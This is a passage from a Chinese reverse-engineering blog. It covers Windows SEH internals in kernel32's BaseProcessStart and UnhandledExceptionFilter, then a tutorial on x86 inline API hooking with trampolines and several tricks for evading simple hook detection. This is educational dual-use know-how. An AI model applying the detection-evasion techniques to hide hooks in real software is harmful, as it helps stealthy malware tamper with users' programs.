class="line"></span><br><span class="line">;调用__SEH_prolog之前的情况</span><br><span class="line">;----&gt;         push    XXX&lt;-- ebp的值被设置到这里(<span class="number">7</span>C8024EA处)</span><br><span class="line">;----&gt;         push    YYY</span><br><span class="line">;----&gt;         push    RETURN ADDRESS-|</span><br><span class="line">;----&gt;  |---&gt;此两句合成call __SEH_prolog</span><br><span class="line">;----&gt;         JMP     __SEH_prolog---|</span><br><span class="line">  </span><br><span class="line"><span class="number">7</span>C8024EE       sub     esp, eax</span><br><span class="line"><span class="number">7</span>C8024F0       push    ebx</span><br><span class="line"><span class="number">7</span>C8024F1       push    esi</span><br><span class="line"><span class="number">7</span>C8024F2       push    edi</span><br><span class="line"><span class="number">7</span>C8024F3       mov     eax, [ebp<span class="number">-8</span>]    ; eax=__SEH_prolog执行后的下一条指令地址</span><br><span class="line"><span class="number">7</span>C8024F6       mov     [ebp<span class="number">-18</span>h], esp  ; [ebp<span class="number">-18</span>h]:esp</span><br><span class="line"><span class="number">7</span>C8024F9       push    eax             ; 重新设置回本函数的下一条指令地址</span><br><span class="line"><span class="number">7</span>C8024FA       mov     eax, [ebp<span class="number">-4</span>]    ; eax=_SCOPETABLE,保存_SCOPETABLE</span><br><span class="line"><span class="number">7</span>C8024FD       mov     dword ptr [ebp<span class="number">-4</span>], <span class="number">0F</span>FFFFFFFh ; [ebp<span class="number">-04</span>]:TryLevel(<span class="number">0F</span>FFFFFFh),设置TryLevel</span><br><span class="line"><span class="number">7</span>C802504       mov     [ebp<span class="number">-8</span>], eax    ; 将_SCOPETABLE设置到[ebp<span class="number">-08</span>]的位置</span><br><span class="line">           ; 也就是本函数原先下一条指令地址所在位置</span><br><span class="line"><span class="number">7</span>C802507       lea     eax, [ebp<span class="number">-10</span>h]</span><br><span class="line"><span class="number">7</span>C80250A       mov     large fs:<span class="number">0</span>, eax ; 安装新的SEH</span><br><span class="line"><span class="number">7</span>C802510       retn</span><br><span class="line"><span class="number">7</span>C802510 __SEH_prolog</span><br></pre></td></tr></table></figure><p>如果没有<code>__SEH_prolog</code>这个函数，<code>BaseProcessStart</code>看起来应该是下面这个样子：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> VC_EXCEPTION_REGISTRATION    struc   ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, standard type)</span><br><span class="line"><span class="number">00</span> old_esp         dd ?          ; ESP</span><br><span class="line"><span class="number">04</span> exc_ptr         dd ?          ; GetExceptionInformation返回值</span><br><span class="line"><span class="number">08</span> prev_er         dd ?          ; prev _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line"><span class="number">0</span>C handler         dd ?          ; handler</span><br><span class="line"><span class="number">10</span> msEH_ptr        dd ?          ; _SCOPETABLE</span><br><span class="line"><span class="number">14</span> disabled        dd ?          ; trylevel</span><br><span class="line"><span class="number">18</span> VC_EXCEPTION_REGISTRATION    ends</span><br><span class="line"> </span><br><span class="line"> ; <span class="function">__stdcall <span class="title">BaseProcessStart</span><span class="params">(x)</span></span></span><br><span class="line"> _BaseProcessStart@4 proc near  ; CODE XREF: BaseProcessStartThunk(x,x)+5j</span><br><span class="line"></span><br><span class="line"> ms_exc = VC_EXCEPTION_REGISTRATION ptr <span class="number">-18</span>h</span><br><span class="line"> arg_0  = dword ptr  <span class="number">8</span> </span><br><span class="line">push ebp            ;[ebp<span class="number">-00</span>]:ebp</span><br><span class="line">mov ebp,esp </span><br><span class="line">push <span class="number">0F</span>FFFFFFFh              ;[ebp<span class="number">-04</span>]:trylevel</span><br><span class="line">push offset stru_7C817080    ;[ebp<span class="number">-08</span>]:_SCOPETABLE</span><br><span class="line">push offset __except_handler3;[ebp<span class="number">-0</span>C]:handler</span><br><span class="line">mov eax,fs:[<span class="number">0</span>]</span><br><span class="line">push eax          ;[ebp<span class="number">-10</span>]:prev _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">sub esp,<span class="number">0</span>Ch      ;[ebp<span class="number">-14</span>]:GetExceptionInformation返回值</span><br><span class="line">         ;[ebp<span class="number">-18</span>]:esp</span><br><span class="line">     ;[ebp<span class="number">-1</span>C]:ExceptionCode</span><br><span class="line">push ebx </span><br><span class="line">push esi</span><br><span class="line">push edi</span><br><span class="line">mov [ebp<span class="number">-18</span>h],esp ;保存当前esp</span><br><span class="line">lea eax,[ebp<span class="number">-10</span>h]</span><br><span class="line">mov fs:[<span class="number">0</span>],eax ;安装新的_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line"><span class="keyword">and</span>[ebp+ms_exc.disabled], <span class="number">0</span> ;[ebp<span class="number">-04</span>]:trylevel=<span class="number">0</span>,即本函数只有一个__try/__except结构</span><br><span class="line">push<span class="number">4</span>                       ;入口函数的存放位置大小</span><br><span class="line">leaeax,[ebp+arg_0]</span><br><span class="line">push    eax                     ;入口函数的存放位置</span><br><span class="line">push    <span class="number">9</span>                       ;设置线程的入口函数</span><br><span class="line">push    <span class="number">0F</span>FFFFFFEh              ;GetCurrentThread()</span><br><span class="line">call    ds:__imp__NtSetInformationThread@<span class="number">16</span> ;设置线程入口函数为mainCRTStartup</span><br><span class="line">call    [ebp+arg_0]                        ;调用C/C++运行库的mainCRTStartup</span><br><span class="line">push    eax</span><br><span class="line">loc_xxxxxxxx:</span><br><span class="line">call   _ExitThread@<span class="number">4</span></span><br><span class="line">_BaseProcessStart@<span class="number">4</span> endp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>BaseProcessStart</code>使用<code>VC_EXCEPTION_REGISTRATION</code>扩展操作系统的异常处理帧。它使得<code>BaseProcessStart</code>只使用一层的<code>__try/__except</code>结构就可以直接查看<code>_SCOPETABLE(stru_7C817080)</code>。</p><h2 id="SCOPETABLE-1"><a href="#SCOPETABLE-1" class="headerlink" title="_SCOPETABLE"></a>_SCOPETABLE</h2><p><code>BaseProcessStart</code>在调用<code>__SEH_prolog</code>之前压入了两个值，它们分别是<code>0Ch</code>和<code>stru_7C817080</code>。<code>0C</code>的作用是为SEH分配足额的空间，<code>stru_7C817080</code>则是SEH的**_SCOPETABLE**，也就是<code>BaseProcessStart</code>捕获异常时候的过滤函数以及处理函数所在的位置。</p><p>查看一下stru_7C817080：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">SCOPETABLE</span>   </span></span><br><span class="line"><span class="class">&#123;</span>   </span><br><span class="line">DWORD previousTryLevel;   </span><br><span class="line">DWORD lpfnFilter;   </span><br><span class="line">DWORD lpfnHandler;   </span><br><span class="line">&#125; _SCOPETABLE, *P_SCOPETABLE;</span><br><span class="line"></span><br><span class="line">_SCOPETABLE stru_7C817080 = &#123;<span class="number">0x0FFFFFFFF</span>,loc_7C8438EA, loc_7C843900&#125;</span><br></pre></td></tr></table></figure><p><strong>上面说了，函数中的每个<code>__try</code>块都有一个相应的_SCOPETABLE结构。</strong></p><h3 id="prviousTryLevel"><a href="#prviousTryLevel" class="headerlink" title="prviousTryLevel"></a>prviousTryLevel</h3><p>第一个成员<code>prviousTryLevel</code>成员用于嵌套的<code>__try</code>块。当前为0x0FFFFFFFF代表当前代码没有被嵌套在<code>__try/__except</code>里面。</p><h3 id="lpfnFilter"><a href="#lpfnFilter" class="headerlink" title="lpfnFilter"></a>lpfnFilter</h3><p>第二个成员<code>lpfnFilter</code>是异常过滤器表达式的地址。</p><p>分析一下它的异常过滤器表达式(loc_7C8438EA):</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>C8438EA loc_7C8438EA:    ; DATA XREF: .text:stru_7C817080o</span><br><span class="line"><span class="number">7</span>C8438EA    mov     eax, [ebp<span class="number">-14</span>h];执行完毕，eax指向EXCEPTION_POINTERS结构</span><br><span class="line"><span class="number">7</span>C8438ED    mov     ecx, [eax];执行完毕，ecx指向EXCEPTION_RECORD结构</span><br><span class="line"><span class="number">7</span>C8438EF    mov     ecx, [ecx];执行完毕，ecx中是ExceptionCode的值</span><br><span class="line"><span class="number">7</span>C8438F1    mov     [ebp<span class="number">-1</span>Ch], ecx;</span><br><span class="line"><span class="number">7</span>C8438F4    push    eax;ExceptionInfo</span><br><span class="line"><span class="number">7</span>C8438F5    call    _UnhandledExceptionFilter@<span class="number">4</span> ; UnhandledExceptionFilter</span><br><span class="line"><span class="number">7</span>C8438FA    retn</span><br></pre></td></tr></table></figure><p>有了异常过滤器表达式，<code>BaseProcessStart</code>看起来是这个样子：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_THREAD_ENTRY_ROUTINE    9   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VC_EXCEPTION_REGISTRATION</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">DWORD old_esp; <span class="comment">//ESP</span></span><br><span class="line">DWORD exc_ptr;  <span class="comment">//GetExceptionInformation返回值</span></span><br><span class="line">DWORD prev_er;  <span class="comment">//prev _EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line">DWORD handler;  <span class="comment">//handler</span></span><br><span class="line">DWORD msEH_ptr; <span class="comment">//_SCOPETABLE</span></span><br><span class="line">DWORD disabled; <span class="comment">//trylevel</span></span><br><span class="line">&#125;VC_EXCEPTION_REGISTRATION,*PVC_EXCEPTION_REGISTRATION;</span><br><span class="line"></span><br><span class="line"><span class="function">__stdcall <span class="title">BaseProcessStart</span><span class="params">(LPVOID lpfnStartRoutine)</span>   </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    DWORD retValue = <span class="number">0</span>;   </span><br><span class="line">    __try  &#123;   </span><br><span class="line">        <span class="comment">//将主线程的入口函数设置为mainCRTStartup   </span></span><br><span class="line">        NtSetInformationThread(GetCurrentThread(),SET_THREAD_ENTRY_ROUTINE,   </span><br><span class="line">            &amp;lpfnStartRoutine,<span class="keyword">sizeof</span>(lpfnStartRoutine));   </span><br><span class="line">           </span><br><span class="line">        retValue = lpfnStartRoutine();   </span><br><span class="line">    &#125;   </span><br><span class="line">    __except(retValue=GetExceptionCode(),</span><br><span class="line">    UnhandledExceptionFilter(GetExceptionInformation()))   </span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="comment">/*... ...*/</span>  </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lpfnHandler"><a href="#lpfnHandler" class="headerlink" title="lpfnHandler"></a>lpfnHandler</h3><p>第三个成员<code>lpfnHandler</code>是异常处理函数的地址。</p><p>分析异常处理函数(loc_7C843900)：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>C817078 loc_7C817078:              ; CODE XREF: .text:<span class="number">7</span>C84390D j</span><br><span class="line"><span class="number">7</span>C817078    call    _ExitThread@<span class="number">4</span>   ; ExitThread(x)</span><br><span class="line">... ...</span><br><span class="line">... ...     </span><br><span class="line"><span class="number">7</span>C843900 loc_7C843900:              ; DATA XREF: .text:stru_7C817080o</span><br><span class="line"><span class="number">7</span>C843900    mov     esp, [ebp<span class="number">-18</span>h]  ; 恢复当前esp</span><br><span class="line"><span class="number">7</span>C843903    push    dword ptr [ebp<span class="number">-1</span>Ch]</span><br><span class="line"><span class="number">7</span>C843906    cmp     _BaseRunningInServerProcess, <span class="number">0</span> ; 判断是常规进程还是服务</span><br><span class="line"><span class="number">7</span>C84390D    jnz     loc_7C817078    ; 如果是服务就退出当前线程</span><br><span class="line"><span class="number">7</span>C843913    call    _ExitProcess@<span class="number">4</span>  ; 如果是常规进程就直接结束进程</span><br></pre></td></tr></table></figure><p>综上，我们得到最终的Kernel32.dll!BaseProcessStart伪代码如下:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BaseProcessStart</span><span class="params">(PVOID lpfnEntryPoint)</span> <span class="comment">//参数为线程函数的入口地址</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     DWORD retValue;</span><br><span class="line">     DWORD currentESP;</span><br><span class="line">     DWORD exceptionCode;</span><br><span class="line">     currentESP = ESP; </span><br><span class="line"></span><br><span class="line">     <span class="comment">//lpfnEntryPoint被try/except封装着，这是系统安装的默认的异常处理程序，也是SEH链上最后一个异常处理程序</span></span><br><span class="line">     __try</span><br><span class="line">     &#123;</span><br><span class="line">         NtSetInformationThread(GetCurrentThread(),ThreadQuerySetWin32StartAddress,</span><br><span class="line">                                &amp;lpfnEntryPoint,<span class="keyword">sizeof</span>(lpfnEntryPoint));</span><br><span class="line">         retValue = lpfnEntryPoint();</span><br><span class="line">         ExitThread(retValue); <span class="comment">//如果异常，线程从这里退出！</span></span><br><span class="line">     &#125;</span><br><span class="line">     __except (exceptionCode = GetExceptionInformation(),</span><br><span class="line">         UnhandledExceptionFilter(GetExceptionInformation())) <span class="comment">//出现异常调用UnhandledExceptionFilter这个函数。</span></span><br><span class="line">     &#123; <span class="comment">//如果UnhandledExceptionFilter返回EXCEPTION_EXECUTE_HANDLER，则会控制流会执行到这里</span></span><br><span class="line">         ESP = currentESP;</span><br><span class="line">         <span class="keyword">if</span> (!_BaseRunningInServerProcess) <span class="comment">//如果是普通进程，则退出进程</span></span><br><span class="line">              ExitProcess(exceptionCode);</span><br><span class="line">         <span class="keyword">else</span> <span class="comment">// 线程是作为服务来运行的，只退出线程并不终止整个服务</span></span><br><span class="line">              ExitThread(exceptionCode);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>lpfnEntryPoint</code>被<code>__try/__except</code>封装着，这是系统安装的默认的异常处理程序，也是SEH链上最后一个异常处理程序。</p><p>如果<code>lpfnEntryPoint</code>API正常返回，则说明线程没有引发异常。这时<code>BaseProcessStart</code>调用<code>ExitThread</code>退出线程。</p><p>如果线程引发了一个异常但是没有异常处理程序来处理它，这时候程序流程转到执行<code>__except</code>括号中的过滤器表达式代码，其中有一个<code>UnhandledExceptionFilter</code>API，该API包含了默认的异常处理程序。</p><p>如果<code>UnhandledExceptionFilter</code>返回<code>EXCEPTION_EXECUTE_HANDLER</code>，这时BaseProcessStart中的<code>__except</code>块调用<code>ExitProcess</code>函数去终止当前出错的进程。<code>UnhandledExceptionFilter</code>会显示一个对话框报告发生了一个错误。这时，我们可以终止或者调试这个出错的进程。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210404131527.png" alt="报错对话框001"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210404131542.png" alt="报错对话框002"></p><p>如果<code>UnhandledExceptionFilter</code>返回<code>EXCEPTION_CONTINUE_SEARCH</code>，系统会继续向外层寻找异常过滤程序。但如果每个异常过滤程序都返回<code>EXCEPTION_CONTINUE_SEARCH</code>时，说明没有程序处理该异常。</p><p>那么，<code>UnhandledExceptionFilter</code>这个API内部到底干了什么事呢？</p><h1 id="UnhandledExceptionFilter"><a href="#UnhandledExceptionFilter" class="headerlink" title="UnhandledExceptionFilter"></a>UnhandledExceptionFilter</h1><p>当然，这后面发生很多事情。通常情况下我们并不直接调用<code>UnhandledExceptionFilter</code>。它都是由Kernel32中进行默认异常处理的过滤器表达式代码调用。</p><p>首先，判断是否是对资源进行写入操作引发的异常。如果是，将资源的只读属性改为可写入，并返回<code>EXCEPTION_CONTINUE_EXECUTION</code>以允许失败的指令再次执行。</p><p>其次，使用<code>NtQueryInformationProcess</code>函数判断进程是否处于被调试状态（进程的创建标志中是否带有标志<code>DEBUG_PROCESS</code>或<code>DEBUG_ONLY_THIS_PROCESS</code>）。如果被调试，就返回<code>EXCEPTION_CONTINUE_SEARCH</code>给调试器，通知调试器定位异常指令，并告知我们出了什么样的异常。</p><p>紧接着，调用我们安装的未处理异常过滤器（如果存在的话）。如果我们没有安装回调函数，可以调用 <code>SetUnhandledExceptionFilter</code>这个API来安装。如果未处理异常过滤器返回<code>EXCEPT_EXECUTE_HANDLER</code>或<code>EXCEPTION_CONTINUE_EXECUTION</code>，将直接传递给<code>UnhandledExceptionFilter</code>，由它将返回值给系统。如果返回<code>EXCEPT_CONTINUE_SEARCH</code>，则进行下一步。</p><p>之后，再次将未处理异常报告给调试器。</p><p>最后，终止进程，如果线程调用<code>SetErrorMode</code>并设置<code>SEM_NOGPFAULTERRORBOX</code>标志，那么<code>UnhandledExceptFilter</code>会返回<code>EXCEPTION_EXECUTE_HANDLER</code>，在未处理异常的情况下进行全局展开并执行未执行的<code>__finally</code>块，然后进程终止，实际上更准确的说法应该是，系统进行了一些设置使得产生未处理异常的进程将自身终止掉了。</p><p>如果没有调用<code>SetErrorMode</code>函数，<code>UnhandledExceptionFilter</code>会返回<code>EXCEPTION_CONTINUE_SEARCH</code>。于是系统内核得到程序控制，它将通过ALPC（高级本地过程调用）机制将异常通知给WerSvc（Windows错误报告专用服务），然后ALPC先阻塞自己的线程，直到WerSvc执行完毕。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TEB&quot;&gt;&lt;a href=&quot;#TEB&quot; class=&quot;headerlink&quot; title=&quot;TEB&quot;&gt;&lt;/a&gt;TEB&lt;/h1&gt;&lt;p&gt;还是从TEB开始讲。&lt;/p&gt;
&lt;p&gt;TEB（Thread Environment Block，线程环境块）是一个结构体，结构体中包含</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Anti-debug" scheme="http://0xnope.top/tags/Anti-debug/"/>
    
  </entry>
  
  <entry>
    <title>浅谈x86API-Hooking</title>
    <link href="http://0xnope.top/2021/03/30/%E6%B5%85%E8%B0%88x86API-Hooking/"/>
    <id>http://0xnope.top/2021/03/30/%E6%B5%85%E8%B0%88x86API-Hooking/</id>
    <published>2021-03-30T12:18:22.000Z</published>
    <updated>2021-03-30T12:34:38.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文学习x86下API挂钩的几种方法。</p><p>在下面，我们将学习API挂钩，我们可以用它做什么，为什么API挂钩非常有用，最基本的API挂钩形式。</p><p>并且，在学习了一种简单的API挂钩方法之后，我们将学习一些鲜为人知和已使用（如果有的话）的方法，以及在使用任何类型的挂钩方法时要记住的一些其他技巧。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>如下是维基百科对”Hook“的简要说明：</p><blockquote><p>In computer programming, the term hooking covers a range of techniques used to alter or augment the behavior of an operating system, of applications, or of other software components by intercepting function calls or messages or events passed between software components. Code that handles such intercepted function calls, events or messages is called a “hook”.</p><p>在计算机编程中，术语“挂钩”涵盖了一系列技术，这些技术通过截获在软件组件之间传递的函数调用或消息或事件来更改或增强操作系统，应用程序或其他软件组件的行为。处理此类拦截的函数调用，事件或消息的代码称为“挂钩”。</p></blockquote><p>现在我们知道，通过钩子，我们可以更改现有软件的行为。</p><p>一步一个脚印，在进一步学习之前，下面先学习基本的钩子的用法。</p><h2 id="基本的API挂钩"><a href="#基本的API挂钩" class="headerlink" title="基本的API挂钩"></a>基本的API挂钩</h2><p>挂钩的最简单方法是插入一个JMP指令。</p><p>x86的指令集具有可变长度的指令大小（即一条指令的长度最大为1字节至16字节）。</p><p>JMP指令长度为5字节。第1个字节（E8）代表操作码JMP，后面的4个字节代表32位<strong>相对偏移</strong>（当前jmp指令地址距离目标函数地址的字节数）。</p><p>（注意，还有一个无条件跳转指令，其相对偏移为8位，但在本示例中我们将不使用该指令。）</p><p>现在，假设我们有两个函数，funcA和funcB，我们如何从funcA跳到到funcB？显然我们得使用JMP指令。</p><p>现在剩下要做的就是计算正确的相对偏移量。</p><p>假设funcA位于地址0×401000，funcB位于地址0×401800。两个函数之间的相对偏移量为0×800字节。</p><p>构造jmp指令时，指令为：<strong>jmp (0x401800-(0x401000 + 5))</strong></p><p>Question：</p><p>指令为什么不是 **jmp (0x401800-0x401000)**呢？</p><p>我来说说，因为我发现好多文章都没谈论过这个问题。</p><p>假设我们已经将JMP指令写到了funcA地址0x401000，然后被执行，</p><p>CPU将执行以下操作:</p><ol><li>首先，它将指令的长度添加到到EIP寄存器（JMP 0x800的长度为5）</li><li>然后将相对偏移量添加到到EIP（0x401800 - 0x401000 = 0x800）</li></ol><p>也就是说，我们减去5是因为，这是CPU在执行该指令时添加的跳转指令的长度，不然EIP就指向0x401805了。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330202259.png" alt="inline_hook001"></p><p>被hook过后，原指令被覆盖，可以看到，前三个指令的总长度是6个字节，由于我们的跳转指令仅仅使用5个字节，多出来的这1个字节我们用nop（硬编码0x90）指令将其覆盖掉。被覆盖的指令被称之为<strong>stolen bytes</strong>。</p><h2 id="Trampoline"><a href="#Trampoline" class="headerlink" title="Trampoline"></a>Trampoline</h2><p>现在我们将funcAhook了，并将其跳转到了funcB，但是现在有一个问题，如果我们想要继续执行hook前的原funcA函数而不执行funcB函数，我们应该怎么做呢？为此，我们需要构造一个trampoline函数。</p><p>下面的代码显示一个简单的例子，该示例使用trampoline函数执行挂钩前的funcA函数，trampoline_funcA表示到funcA的trampoline函数。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 被hook的函数funcA</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">funcA</span><span class="params">(<span class="keyword">int</span> value, <span class="keyword">int</span> value2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挂钩函数的Trampoline函数</span></span><br><span class="line"><span class="comment">// 不执行钩子的funcA </span></span><br><span class="line"><span class="keyword">void</span> (*Trampoline_funcA)(<span class="keyword">int</span> value, <span class="keyword">int</span> value2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是我们执行的挂钩函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">funcB</span><span class="params">(<span class="keyword">int</span> value, <span class="keyword">int</span> value2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//修改参数并执行原始功能</span></span><br><span class="line">    Trampoline_funcA(value + <span class="number">1</span>, value2 + <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们覆盖了funcA函数的前五个字节。为了执行原始功能，如果没有挂钩，我们必须执行挂钩时被覆盖的字节，然后跳转到函数A的地址加上几个字节（因此我们将跳过该跳转。）这便是上面的代码中做的事情，但是没有给出具体的实现代码。</p><p>如下是一张展示trampoline内部工作原理的图片。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330202400.png" alt="inline_hook002"></p><p>从图中我们可以看出执行流程：</p><p>调用funcA函数执行挂钩，在funcB函数当中完成某些操作，但是在地址0x401A00处，我们想要执行原funcA函数。这就是trampline。</p><p>它由两部分组成，之前被覆盖的几个字节（这就是之前说的<strong>stolen bytes</strong>）和JMP，但是跳过了钩子。偏移的计算方式和之前类似。</p><p>offset = (trampoline_funcA + 6) - (funcA + 6) - 5;</p><p>在下一章 构造Trampoline 中，我们将更详细地介绍如何构造Trampoline。</p><h2 id="改进挂钩"><a href="#改进挂钩" class="headerlink" title="改进挂钩"></a>改进挂钩</h2><p>我们已经看到了基本的API挂钩和Trampoline，这种挂钩方法非常简单（插入跳转指令）。</p><p>但是，由于0xE9是32位下相对偏移跳转的硬编码，因此也很容易检测到。</p><p>基本API挂钩方法中示例的检测如下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(*funcA == <span class="number">0xE9</span> ) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;funcA当中检测到钩子！！！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将讨论尝试绕过这种检测的各种方法。</p><h3 id="Method-I-Prepend-a-Nop"><a href="#Method-I-Prepend-a-Nop" class="headerlink" title="Method I: Prepend a Nop"></a>Method I: Prepend a Nop</h3><p>上面这种检测方法就是对funcA的第一条指令的第一个字节硬编码（0xE9）进行检测，那么我们可以将第一条nop来躲避检测。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330202532.png" alt="inline_hook003"></p><p>请注意，跳转指令现在位于地址0×401001（function_A + 1）处，这会将相对偏移量更改为1。</p><p>但我们只需要将上面的检测函数稍加修改，就可以将其检测出来。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *addr = funcA;</span><br><span class="line"><span class="keyword">while</span> (*addr == <span class="number">0x90</span>) addr++;</span><br><span class="line"><span class="keyword">if</span>(*addr == <span class="number">0xE9</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;funcA当中检测到钩子！！！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它跳过所有操作码为0×90的nop指令，并在所有nop指令之后检查是否有跳转。</p><h3 id="Method-II-Push-Retn"><a href="#Method-II-Push-Retn" class="headerlink" title="Method II: Push/Retn"></a>Method II: Push/Retn</h3><p>push指令将32位值压入堆栈，而retn指令将32位地址从堆栈弹出到EIP中（换句话说，它从堆顶的地址开始执行）。</p><p>此方法总共六个字节，如下所示。</p><p>请注意，push指令使用绝对地址，而不是相对地址。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330202632.png" alt="inline_hook004"></p><p>当然，上面这种写法的检测如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *addr = func_A;</span><br><span class="line"><span class="keyword">if</span>(*addr == <span class="number">0x68</span> &amp;&amp; addr[<span class="number">5</span>] == <span class="number">0xc3</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;funcA当中检测到钩子！！！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0×68是push指令的操作码，0xc3是retn指令的操作码。</p><p>但是我们可以在push之前，或者push和retn之间填充nop指令，这样可以绕过此检测。</p><p><strong>Method III: Floating Points</strong></p><p>此前我们讨论的方法都集中在普通的x86指令上，现在来学习一些涉及浮点运算的方法。</p><p>此方法类似于push / retn方法，我们将虚拟的值压入堆栈，然后用实际地址覆盖此虚拟值，然后返回。</p><p>以下是该技术不同于上面方法的地方：</p><p>我们不将跳转的地址存储为32位地址，而是将其存储为64位浮点数。</p><p>然后，我们读取它（使用fld指令），然后将其转换为32位的值（使用fistp指令）。</p><p>下图展示了该技术，该钩子使用11个字节，因此比以前的方法要多一点，但这是一个很不错的方法。</p><p>还要注意，floating_ptr是指向64位浮点值的指针，该值包含钩子函数的地址。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330202823.png" alt="inline_hook005"></p><p>构造浮点非常容易，其过程如下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">double</span> floating_point_value = (<span class="keyword">double</span>) func_B;</span><br></pre></td></tr></table></figure><p>与前面的示例一样，函数B是我们的hook函数。</p><p>就像其他方法一样，调用原始函数是通过蹦床完成的。</p><p>除非在这种情况下，蹦床必须至少包含在该函数的前十一个字节中找到的指令。）</p><p>显然，这只是冰山一角，有许多浮点指令可能对这种情况有用。</p><p>例如。</p><p>您可以通过将值乘以π（Pi，可以使用fldpi指令获得）来计算挂钩地址。</p><h3 id="Method-IV-MMX-SSE"><a href="#Method-IV-MMX-SSE" class="headerlink" title="Method IV: MMX/SSE"></a>Method IV: MMX/SSE</h3><p>此技术类似于使用浮点数进行挂钩的技术。</p><p>但是，我们在这里使用MMX / SSE x86扩展，而不是使用浮点数。</p><p>与浮点技术一样，这两种技术都使用push / retn方法。</p><p>第一种方法涉及MMX指令，尤其是movd指令。</p><p>就像fistp指令（浮点指令）一样，它允许从内存中读取值并将值存储到堆栈中。</p><p>使用SSE指令的第二种方法利用相同的movd指令。</p><p>两种方法之间的唯一区别是MMX指令在64位寄存器上运行，而SSE指令在128位寄存器上运行。</p><p>(尽管在我们的例子中这并不有趣，因为movd指令允许读取和写入32位值。）</p><p>无论哪种方式，由于此技术与浮点技术完全相同，除了所使用的指令外，没有图像（无需在本文中填充图像。）</p><h3 id="Method-V-Indirect-Jump"><a href="#Method-V-Indirect-Jump" class="headerlink" title="Method V: Indirect Jump"></a>Method V: Indirect Jump</h3><p>间接跳转基本上是说，跳转到此处可以找到的地址。</p><p>在“基本API挂钩”部分中，我们介绍了相对跳转，它们是直接跳转。</p><p>间接跳转更像Push / Retn方法。</p><p>间接跳转的长度为6个字节，一个示例钩子如下所示。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330202919.png" alt="inline_hook006"></p><p>请注意，hook_func_ptr表示一个地址，可以在其中找到我们的挂钩函数（例如函数B）的地址。</p><h3 id="Method-VI-Call-Instruction"><a href="#Method-VI-Call-Instruction" class="headerlink" title="Method VI: Call Instruction"></a>Method VI: Call Instruction</h3><p>之前所有的hook方法都直接跳到hook函数本身（funcB）中，但此方法需要额外的步骤。</p><p>因为在将返回地址压栈后，调用指令跳至指定的地址（返回地址为当前指令指针加上指令的长度）。</p><p>因为堆栈上现在有一个额外的返回地址，我们首先必须从堆栈中弹出这个地址，否则堆栈将被破坏。(例如，钩子函数将从堆栈读取不正确的参数，因为堆栈指针是不正确的。)我们通过向堆栈指针添加4将这个地址从堆栈中弹出(当地址被推到堆栈上时，堆栈指针首先递减4，然后地址被写入更新后的堆栈指针所指向的地址)。在地址从堆栈中弹出后，我们跳转到挂钩函数。</p><p>该技术适用于调用指令的直接和间接变体。</p><p><img 